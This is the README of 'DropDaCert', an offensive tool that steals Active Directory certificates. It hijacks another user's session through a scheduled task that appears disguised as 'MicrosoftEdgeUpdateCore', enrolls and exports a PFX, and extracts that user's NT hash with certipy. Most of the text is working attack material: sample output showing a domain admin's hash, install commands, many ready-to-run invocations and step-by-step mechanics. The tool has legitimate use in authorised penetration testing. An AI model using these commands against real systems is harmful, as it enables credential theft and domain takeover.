# DropDaCert

ADCS certificate theft via scheduled task session hijacking.

Drops a scheduled task on a target that runs in an active user's session context (`InteractiveToken`), enrolls a certificate via `certreq`, exports the PFX, and runs `certipy auth` to extract the NT hash.

```
┌──(kali㉿kali)-[~/DropDaCert]
└─$ python3 DropDaCert.py administrator:'P@ssw0rd'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1

  DropDaCert v2.0

  [+] Resolving target: 10.0.0.5
  [+] Target: SRV01.corp.local (10.0.0.5)
  [+] Connecting via WinRM (NTLM)...
  [+] Connected

  #    State    Session              User
  ---- -------- -------------------- ------------------------------
  0    Active   rdp-tcp#0            CORP\jsmith
  1    Active   rdp-tcp#1            CORP\admin-da

  [?] Pick session # to target: 1

  [+] Target session: CORP\admin-da (session 3, Active)
  [+] Payload uploaded
  [+] Task 'MicrosoftEdgeUpdateCore' created
  [+] Task triggered
  [+] Waiting for PFX (timeout: 90s)...........
  [+] PFX saved: output/cert.pfx (3286 bytes)

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'admin-da@corp.local'
[*] Using principal: 'admin-da@corp.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'admin-da.ccache'
[*] Trying to retrieve NT hash for 'admin-da'
[*] Got hash for 'admin-da@corp.local': aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
```

## Install

```bash
git clone https://github.com/mattmillen15/DropDaCert.git && cd DropDaCert
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt
curl -sL https://raw.githubusercontent.com/sensepost/susinternals/main/psexecsvc.py -o psexecsvc.py
```

This installs [certipy](https://github.com/ly4k/Certipy) and [psexecsvc](https://github.com/sensepost/susinternals) (needed for `--exec-method smb`).

## Usage

```
python3 DropDaCert.py [[domain/]username[:password]@]target -ca HOST\CA -dc DC_IP [options]
```

### Examples

```bash
# Password auth, interactive session picker
python3 DropDaCert.py administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1

# Target a specific user
python3 DropDaCert.py administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1 -tu jsmith

# Domain auth
python3 DropDaCert.py corp.local/admin:'Pass'@server01 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1

# NTLM hash
python3 DropDaCert.py administrator@10.0.0.5 -H :abc123def... -ca 'CA01\CA' -dc 10.0.0.1

# Kerberos
python3 DropDaCert.py corp.local/admin:'Pass'@server01 -k -ca 'CA01\CA' -dc 10.0.0.1

# Kerberos with ccache
export KRB5CCNAME=admin.ccache
python3 DropDaCert.py corp.local/admin@server01 -k -ca 'CA01\CA' -dc 10.0.0.1

# SMB exec (no WinRM needed)
python3 DropDaCert.py admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method smb

# TSCH RPC exec (no WinRM, no service binary — just SMB + task scheduler RPC)
python3 DropDaCert.py admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method tsch

# Manual mode — generate files and print instructions only
python3 DropDaCert.py admin@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method manual -tu jsmith

# Non-admin target (C:\Users\Public)
python3 DropDaCert.py admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 -tu lowpriv \
  --drop-dir 'C:\Users\Public'
```

### Options

| Flag | Description |
|------|-------------|
| `-ca HOST\CA` | CA config string (required) |
| `-dc IP` | Domain controller IP (required) |
| `-tu USER` | Target user (skip session picker) |
| `-H [LM:]NT` | NTLM hash |
| `-k` | Kerberos auth |
| `--aes-key HEX` | AES key for Kerberos |
| `--exec-method` | `winrm` (default), `smb`, `tsch`, `manual` |
| `--exec-wrapper` | `conhost` (default), `cmd`, `powershell`, `wscript` |
| `--drop-dir` | Remote drop directory (default: `C:\Windows\Tasks`) |
| `--template` | Certificate template (default: `User`) |
| `--timeout` | PFX wait timeout in seconds (default: 90) |
| `--ldap-shell` | LDAP shell via certipy instead of NT hash |
| `--no-cleanup` | Leave files and task on target |

## How it works

1. Connects via WinRM (default), SMB (psexecsvc), or TSCH (direct task scheduler RPC)
2. Enumerates active sessions (WMI for WinRM/SMB, WKSSVC RPC for TSCH)
3. Uploads `cert.inf` and `cert.bat` via SMB
4. Creates scheduled task — runs in the target user's session context
5. `cert.bat` runs `certreq` to enroll, exports PFX with empty password
6. Polls for PFX via SMB, downloads it
7. Runs `certipy auth` to extract NT hash
8. Cleans up remote files and task

## Credits

- Technique from [NetExec PR #908](https://github.com/Pennyw0rth/NetExec/pull/908) by [@Dfte](https://github.com/Dfte)
- SMB execution via [susinternals](https://github.com/sensepost/susinternals) by [@sensepost](https://github.com/sensepost)
- Certificate auth via [Certipy](https://github.com/ly4k/Certipy) by [@ly4k](https://github.com/ly4k)
